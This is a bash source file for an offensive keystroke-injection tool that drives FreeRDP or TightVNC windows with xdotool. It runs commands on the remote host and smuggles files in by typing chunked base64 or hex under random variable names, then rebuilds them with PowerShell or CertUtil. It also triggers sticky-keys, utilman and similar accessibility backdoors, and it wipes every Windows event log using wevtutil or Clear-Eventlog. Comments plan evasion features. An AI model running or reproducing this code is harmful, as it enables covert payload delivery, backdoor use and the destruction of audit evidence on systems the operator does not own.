#!/bin/bash

# TODO: Add check for xfreerdp-x11 and xtightvncviewer. Also do some checks with supported package managers.

function check_dependencies() {
    if ! which xdotool &>/dev/null
    then
        print_status "warning" "Installing missing dependency..."
        if ! which sudo 2>/dev/null || [[ "${EUID}" -eq 0 ]]
        then
            apt install -y xdotool
        else
            sudo apt install -y xdotool
        fi
        exit 1
    fi
}

# Helper functions

function print_status() {
    local status="${1}"
    local message="${2}"

    # Blue for information
    # Bold Blue for progress
    # Bold Green for completed
    # Bold Yellow for warning
    # Bold Red for error
    # * default to white
    case "${status}" in
        information) color="\033[34m[INFO]\033[0m" ;;
        progress) color="\033[1;34m[PROG]\033[0m" ;;
        completed) color="\033[1;32m[DONE]\033[0m" ;;
        warning) color="\033[1;33m[WARN]\033[0m" ;;
        error) color="\033[1;31m[ERROR]\033[0m" ;;
        *) color="\033[0m" ;;
    esac

    echo -e "${color} ${message}"
}

function Keyboard() {
    local input="${1}"
    local key="${2}"

    if [[ "${key}" == "return" ]]
    then
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
    elif [[ "${key}" == "escapechars" ]]
    then
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
    elif [[ "${key}" == "copycon" ]]
    then
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Ctrl+Z Return
    elif [[ "${key}" == "customkey" ]]
    then
        xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key "${input}"
    elif [[ "${key}" == "noreturn" ]]
    then
    	xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
    fi
}

function RandomString() {
    local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
    local string=""

    for (( i=0; i<${length}; i++ ))
    do
        local random_index=$(( RANDOM % ${#characters} ))
        string+=${characters:$random_index:1}
    done

    echo "${string}"
}

function CountLines() {
    local file="${1}"
    local counter=0

    while read -r line
    do
        (( counter++ ))
    done < "${file}"

    echo "${counter}"
}

# There is a limitation with this implementation. 
# However, this is ideal for uploading files with a specific path.

function DirectoryName() {
    local filepath="${1}"

    # Determine the type of slashes used in the path
    if [[ "${filepath}" == *\\* ]]
    then
        # Handle paths with backslashes (Windows style)
        local directory_name="${filepath%\\*}"

        # Special case: if the result is empty, it means the path was something like "C:\file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "."
            return
        fi

        echo "${directory_name}"
    else
        # Handle paths with forward slashes (Unix style)
        if [[ "${filepath}" != */* ]]
        then
            echo "."
            return
        fi

        local directory_name="${filepath%/*}"

        # Special case: if the result is empty, it means the path was something like "/file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "/"
            return
        fi

        echo "${directory_name}"
    fi
}

function terminate_program() {
    print_status "warning" "SIGINT response detected!"
    print_status "information" "Terminating program..."
    exit 1
}

trap terminate_program SIGINT

function Automate() {
    local file="${1}"
    local lines=$(CountLines "${file}")

    print_status "progress" "Executing commands..."

    # If there are zero new lines just read the remaining file's contents.
    if [[ ${lines} -eq 0 ]]
    then
	read contents < "${file}"
	Keyboard "${contents}" "escapechars"
    else
        while read -r line
        do
            Keyboard "${line}" "escapechars"
        done < "${file}"
    fi
    print_status "completed" "Task completed!"
}

function Execute() {
    local commands="${1}"
    local method="${2}"

    case "${method}" in
        none)
            print_status "progress" "Executing commands..."
            Keyboard "${commands}" "escapechars"
            print_status "completed" "Task completed!"
            ;;
        dialogbox)
            DialogBox "${commands}"
            ;;
        *)
            print_status "error" "Invalid Execution Type!" >&2
            print_status "information" "Available methods are: none, and dialogbox"
			print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function DialogBox() {
    local commands="${1}"

    print_status "information" "Checking one of the lines reaches 260 character limit"
    if [[ ${#commands} -ge 260 ]]
    then
        print_status "error" "Character Limit reached! Terminating program."
        exit 1
    fi

    print_status "progress" "Executing commands..."
    Keyboard "Super+r" "customkey"
    Keyboard "${commands}" "escapechars"
    print_status "completed" "Task completed!"
}

function Base64() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"

    local file_type=$(file --mime-encoding "${input}")
    local data
    local chunks=100

    local random_1=$(RandomString)
    local random_2=$(RandomString)
    local random_3=$(RandomString)

    # TODO: Implement encryption method through base64 with -e,--evasion flag
    # $ rks -i file -o output -m pwshb64 -e compression
    # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
    # $ gzip -c file.exe | basenc -w 0 --base64

    # $ rks -i file -o output -m pwshb64 -e aes256
    # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
    # $ gzip -c file.exe | openssl enc -a -e -A

    # Check if input is passed as file
    if [[ -f "${input}" && ("${platform}" == "windows" || "${platform}" == "linux") && "${mode}" == "powershell" ]]
    then
        if [[ "${file_type}" == *"ascii" ]]
        then
            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        elif [[ "${file_type}" == "binary" ]]
        then
            data=$(basenc -w 0 --base64 "${input}")
        fi

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                Keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
            else
                Keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
            fi
        done

        Keyboard "[byte[]]\$${random_2} = [Convert]::FromBase64String(\$${random_1})" "return"
        Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_2})" "return"

        print_status "completed" "File transferred!"
    elif [[ "${platform}" == "linux" && "${mode}" == "console" ]]
    then
        data=$(basenc -w 0 --base64 "${input}")

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                Keyboard "${random_1}=\"${data:i:chunks}\"" "return"
            else
                Keyboard "${random_1}+=\"${data:i:chunks}\"" "return"
            fi
        done

        Keyboard "base64 -d <<< \$${random_1} > \"${output_file}\"" "return"
        print_status "completed" "File transferred!"
    fi
}

function Base16() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"

    local data
    local chunks=100

    local random_1=$(RandomString)

    local random_temp=$(RandomString)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
    	data=$(basenc -w 0 --base16 "${input}")

    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                Keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
            else
                Keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
            fi
        done

            Keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_1} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "return"
        elif [[ "${mode}" == "certutil" ]]
        then
            if [[ "${platform}" != "windows" ]]
            then
                print_status "error" "This method is only exclusive for windows!"
                print_status "information" "Use 'nixhex' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."

        	for (( i=0; i<${#data}; i+=chunks ))
			do
			    if [[ ${i} -eq 0 ]]
			    then
			        Keyboard "set ${random_1}=${data:i:chunks}" "return"
			    else
			        Keyboard "set ${random_1}=%${random_1}%${data:i:chunks}" "return"
			    fi
			done

			Keyboard "echo %${random_1}% > \"${directory_path}\\${random_temp}.txt\"" "return"
			Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp}.txt\" \"${output_file}\" 12" "return"
			Keyboard "del /f \"${directory_path}\\${random_temp}.txt\"" "return"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            local temp=""
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    Keyboard "${random_1}=\"${temp:i:chunks}\"" "return"
                else
                    Keyboard "${random_1}+=\"${temp:i:chunks}\"" "return"
                fi
            done

			# Interpret the backslash to output into a file.
            Keyboard "echo -en \$${random_1} > \"${output_file}\"" "return"
    	fi
        print_status "completed" "File transferred!"
    fi
}

function PowershellOutFile() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"

    local file_type=$(file --mime-encoding "${input}")
    local data
    local chunks=100
    local hexadecimal=()
    local counter

    local random_temp=$(RandomString)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
        if [[ "${mode}" == "text" ]]
        then
            if [[ "${file_type}" == *"ascii" ]]
            then
                print_status "progress" "Checking one of the lines reaches 3477 character limit"
                while read -r line
                do
                    length=${#line}
                    if [[ ${length} -ge 3477 ]]
                    then
                        print_status "error" "Character Limit reached!"
                        print_status "information" "Use 'outfileb64' as a method instead."
                        print_status "information" "Terminating program..."
                        exit 1
                    fi
                done < "${input}"

                print_status "progress" "Transferring file..."
                Keyboard "@'" "escapechars"
                while read -r line
                do
                    Keyboard "${line}" "return"
                done < "${input}"

                Keyboard "'@ | Out-File ${output_file}" "escapechars"
            elif [[ "${file_type}" == "binary" ]]
            then
                print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
                PowershellOutFile "${input}" "${output_file}" "${platform}" "certutil"
                exit 1
            fi
        elif [[ "${mode}" == "base64" ]]
        then
            chunks=64

            if [[ "${platform}" != "windows" ]]
            then
                print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                print_status "information" "Use 'nixb64' method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base64 "${input}")
            Keyboard "@'" "escapechars"
            Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"

	        for (( i=0; i<${#data}; i+=chunks ))
	        do
	            if [[ ${i} -eq 0 ]]
	            then
	            	Keyboard "${data:i:chunks}" "return"
	            else
	            	Keyboard "${data:i:chunks}" "return"
	            fi
	        done

            Keyboard "-----END CERTIFICATE-----" "escapechars"
            Keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escapechars"
            Keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp}.txt\" ${output_file}" "return"
            Keyboard "Remove-Item -Force \"${directory_path}\\${random_temp}.txt\"" "return"
        elif [[ "${mode}" == "hex" ]]
        then
            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base16 "${input}")

            # Append the pair of hexadecimal characters in a array
            for (( i=0; i<${#data}; i+=2 ))
            do
            	hexadecimal+=("${data:i:2}")
            done

            Keyboard "@'" "escapechars"

            counter=0
            for ((i=0; i<${#hexadecimal[@]}; i++))
            do
                if [[ ${counter} -eq 7 ]]
                then
                	Keyboard "${hexadecimal[i]}" "noreturn"
                	Keyboard "space" "customkey"
                elif [[ ${counter} -eq 8 ]]
                then
                	Keyboard "space" "customkey"
                    (( counter++ ))
                elif [[ ${counter} -eq 15 ]]
                then
                	Keyboard "${hexadecimal[i]}" "return"
                elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
                then
                    Keyboard "${hexadecimal[i]}" "return"
                else
                	Keyboard "${hexadecimal[i]}" "noreturn"
                	Keyboard "space" "customkey"
                fi

                if [[ ${counter} -eq 15 ]]
                then
                    counter=0
                else
                    (( counter++ ))
                fi
            done
            Keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.hex\"" "escapechars"
			Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp}.hex\" \"${output_file}\" 4" "return"
			Keyboard "Remove-Item -Force \"${directory_path}\\${random_temp}.hex\"" "return"
        fi
    fi

    print_status "completed" "File transferred!"
}

function CopyCon() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"

    local file_type=$(file --mime-encoding "${input}")
    local lines=$(CountLines "${input}")
    local data
    local chunks
    local hexadecimal=()
    local counter

    local random_temp=$(RandomString)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "copycon only exists on Windows operating system!"
        print_status "information" "Use 'pwshb64' method instead."
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" && "${mode}" == "text" ]]
    then
        print_status "progress" "Checking one of the lines reaches 255 character limit"
        while read -r line
        do
            if [[ ${#line} -ge 255 ]]
            then
                print_status "error" "Character Limit reached!"
                print_status "information" "Use 'cmdb64' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi
        done < "${input}"

        print_status "progress" "Transferring file..."
        Keyboard "copy con ${output_file}" "return"

        counter=1
        while read -r line
        do
            if [[ ${counter} -ne ${lines} ]]
            then
                Keyboard "${line}" "return"
            else
                Keyboard "${line}" "copycon"
            fi
            (( counter++ ))
        done < "${input}"
    elif [[ "${mode}" == "base64" ]]
    then
        chunks=64

        if [[ "${file_type}" == *"ascii" ]]
        then
            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        elif [[ "${file_type}" == "binary" ]]
        then
            data=$(basenc -w 0 --base64 "${input}")
        fi

        print_status "progress" "Transferring file..."
        Keyboard "copy con \"${directory_path}\\${random_temp}.txt\"" "return"
        Keyboard "-----BEGIN CERTIFICATE-----" "escapechars"

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                Keyboard "${data:i:chunks}" "return"
            else
                Keyboard "${data:i:chunks}" "return"
            fi
        done

        Keyboard "-----END CERTIFICATE-----" "copycon"
        Keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp}.txt\" ${output_file}" "return"
        Keyboard "del /f \"${directory_path}\\${random_temp}.txt\"" "return"
    elif [[ "${mode}" == "hex" ]]
    then
    	print_status "progress" "Transferring file..."
        data=$(basenc -w 0 --base16 "${input}")

        # Append the pair of hexadecimal characters in a array
        for (( i=0; i<${#data}; i+=2 ))
        do
        	hexadecimal+=("${data:i:2}")
        done

        Keyboard "copy con \"${directory_path}\\${random_temp}.hex\"" "return"

		counter=0
		for ((i=0; i<${#hexadecimal[@]}; i++))
		do
            if [[ ${counter} -eq 7 ]]
            then
                Keyboard "${hexadecimal[i]}" "noreturn"
                Keyboard "space" "customkey"
            elif [[ ${counter} -eq 8 ]]
            then
                Keyboard "space" "customkey"
                (( counter++ ))
            elif [[ ${counter} -eq 15 ]]
            then
                Keyboard "${hexadecimal[i]}" "return"
            elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
            then
                Keyboard "${hexadecimal[i]}" "copycon"
            else
               	Keyboard "${hexadecimal[i]}" "noreturn"
               	Keyboard "space" "customkey"
            fi

            if [[ ${counter} -eq 15 ]]
            then
                counter=0
            else
                (( counter++ ))
            fi
        done

		Keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp}.hex\" \"${output_file}\" 4" "return"
		Keyboard "del /f \"${directory_path}\\${random_temp}.hex\"" "return"
    fi

    print_status "completed" "File transferred!"
}

function Upload() {
    local local_file="${1}"
    local remote_file="${2}"
    local platform="${3}"
    local method="${4}"
    local evasion="${5}"

    case "${method}" in
        "" | pwshb64)
            Base64 "${local_file}" "${remote_file}" "${platform}" "powershell"
            ;;
        cmdb64)
            CopyCon "${local_file}" "${remote_file}" "${platform}" "base64"
            ;;
        nixb64)
            Base64 "${local_file}" "${remote_file}" "${platform}" "console"
            ;;
        outfile)
            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "text"
            ;;
        outfileb64)
            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "base64"
            ;;
        copycon)
            CopyCon "${local_file}" "${remote_file}" "${platform}" "text"
            ;;
        pwshhex)
            Base16 "${local_file}" "${remote_file}" "${platform}" "powershell"
            ;;
        cmdhex)
            Base16 "${local_file}" "${remote_file}" "${platform}" "certutil"
            ;;
        copyconhex)
            CopyCon "${local_file}" "${remote_file}" "${platform}" "hex"
            ;;
        nixhex)
            Base16 "${local_file}" "${remote_file}" "${platform}" "console"
            ;;
        outfilehex)
            PowershellOutFile "${local_file}" "${remote_file}" "${platform}" "hex"
            ;;
        *)
            print_status "error" "Invalid File Transfer Technique!" >&2
            print_status "information" "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
			print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function Elevate() {
    local elevate_method="${1}"
    local elevate_action="${2}"
    local platform="${3}"
    # TODO: add -a, --action flag
    # -a info -p <windows | linux> -m bypassuac
    echo "Not implemented"
}

function CreateUser() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" == "windows" ]]
    then
        echo "Windows"
    elif [[ "${platform}" == "linux" ]]
    then
        echo "Linux"
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    else
        print_status "error" "Invalid mode!"
    fi
}

function StickyKey() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
        Keyboard "shift shift shift shift shift" "customkey"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function UtilityManager() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
        Keyboard "Super+u" "customkey"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Magnifier() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating magnifier.exe backdoor..."
        Keyboard "Super+equal" "customkey"
        Keyboard "Super+minus" "customkey"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Narrator() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating narrator.exe backdoor..."
        Keyboard "Super+Return" "customkey"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function DisplaySwitch() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating displayswitch.exe backdoor..."
        Keyboard "Super+p" "customkey"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Persistence() {
    local platform="${1}"
    local persistence_method="${2}"
    local persistence_action="${3}"

    # -a, --action flag "info,backdoor". For "info" contains the execution commands
    # for both command prompt and powershell. To enumerate, persistence and cleanup
    # For "backdoor" to activate the backdoor
    # TODO: Fill in the rest of the persistence methods
    case "${persistence_method}" in
        createuser)
            CreateUser "${platform}" "${persistence_action}"
            ;;
        sethc)
            StickyKey "${platform}" "${persistence_action}"
            ;;
        utilman)
            UtilityManager "${platform}" "${persistence_action}"
            ;;
        magnifier)
            Magnifier "${platform}" "${persistence_action}"
            ;;
        narrator)
            Narrator "${platform}" "${persistence_action}"
            ;;
        displayswitch)
            DisplaySwitch "${platform}" "${persistence_action}"
            ;;
        *)
            print_status "error" "Invalid Persistence Technique!" >&2
            exit 1
            ;;
    esac
}

function WevUtil() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function WinEvent() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function EventViewer() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        # TODO: Include information of this technique
        echo ""
    elif [[ "${action}" == "manual" ]]
    then
        DialogBox "eventvwr.msc"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function AntiForensics() {
    local antiforensics_method="${1}"
    local antiforensics_action="${2}"
    local platform="${3}"
    # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box

    # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
    # -p <windows | linux> -m <wevutil | winevent>

    # Batch script
    # Powershell script
    # Bash script
    case "${antiforensics_method}" in
        wevutil)
            WevUtil "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        winevent)
            WinEvent "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        eventvwr)
            EventViewer "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        *)
            print_status "error" "Invalid Antiforensic Technique!" >&2
            exit 1
            ;;
    esac
}

function FormatDisk() {
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    echo "not implemented"
}

function Mayhem() {
    local mayhem_method="${1}"
    local mayhem_action="${2}"
    local platform="${3}"

    echo "not implemented"
}

# TODO: Add more flags once it's fully implemented
function usage() {
    read -d '' usage << EndOfText
Usage:
    $(basename ${0}) <flags>

Flags:

COMMON OPTIONS:
    -c, --command <command | file>      Specify a command or a file contains commands to execute

    -p, --platform <operating_system>   Specify the operating system ("windows" is set by
                                        default if not specified)

    -w, --windowname <name>             Specify the window name for graphical remote
                                        program ("freerdp" is set by default if not
                                        specified)

    -h, --help                          Display this help message

UPLOAD FILES:
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

METHODS:
    -m, --method <method>               Specify a method. For command execution method
                                        "none" is set by default if not specified.
                                        For file transfer "pwshb64" is set by default
                                        if not specified. Other available methods are:
                                        "elevate", "persistence", "antiforensics", and
                                        "mayhem"

    -s, --submethod <submethod>         Specify a submethod from a method (applies with -m flag)

    -a, --action <action>               Specify an action from a submethod (applies with -s flag)

    -e, --evasion <evasion>             Specify an evasion method for uploading files (only works for "pwshb64")
EndOfText

    echo "${usage}"
    exit 1
}

check_dependencies

LONG_OPTIONS="command:,input:,output:,method:,submethod:,action:,evasion:,platform:,windowname:,help"

OPTIONS=$(getopt -o "c:i:o:m:s:a:e:p:w:h" --long "${LONG_OPTIONS}" -n "$(basename "${0}")" -- "${@}")
if [[ ${?} != 0 ]]
then
    echo "Failed to parse options... Exiting." >&2
    exit 1
fi

eval set -- "${OPTIONS}"

while true
do
    case ${1} in
        -c | --command)
            COMMAND="${2}"
            shift 2
            ;;
        -i | --input)
            INPUT="${2}"
            shift 2
            ;;
        -o | --output)
            OUTPUT="${2}"
            shift 2
            ;;
        -m | --method)
            METHOD="${2,,}"
            shift 2
            ;;
        -s | --submethod)
            SUBMETHOD="${2,,}"
            shift 2
            ;;
        -a | --action)
            ACTION="${2,,}"
            shift 2
            ;;
        -e | --evasion)
            EVASION="${2,,}"
            shift 2
            ;;
        -p | --platform)
            PLATFORM="${2,,}"
            shift 2
            ;;
        -w | --windowname)
            WINDOWNAME="${2,,}"
            shift 2
            ;;
        -h | --help)
            usage
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Invalid option: ${1}" >&2
            exit 1
            ;;
    esac
done

if [[ -z "${WINDOWNAME}" ]]
then
    WINDOWNAME="FreeRDP"
elif [[ "${WINDOWNAME}" != "freerdp" && "${WINDOWNAME}" != "tightvnc" ]]
then
    print_status "error" "Invalid window name specified. Allowed values: 'freerdp', or 'tightvnc'."
    exit 1
fi

# Select graphical remote program to match the window name
if [[ "${WINDOWNAME}" == "freerdp" ]]
then
    WINDOWNAME="FreeRDP"
elif [[ "${WINDOWNAME}" == "tightvnc" ]]
then
    WINDOWNAME="TightVNC"
fi

if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
then
    # When input is string and not a file. It executes command
    if [[ -z "${METHOD}" ]]
    then
        METHOD="none"
    fi
    Execute "${COMMAND}" "${METHOD}"
elif [[ -f "${COMMAND}" ]]
then
    # Check if a file is passed as input then execute commands
    Automate "${COMMAND}"
fi

# When the input for selecting an operating system is empty
# it'll choose "windows" as default.
if [[ -z "${PLATFORM}" ]]
then
    PLATFORM="windows"
elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
then
    print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
    exit 1
fi

if [[ -f "${INPUT}" && -n "${OUTPUT}" && (-z "${METHOD}" || -n "${METHOD}") ]]
then
    Upload "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}"
elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
then
    Elevate "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
then
    Persistence "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
then
    AntiForensics "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
then
    Mayhem "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
fi
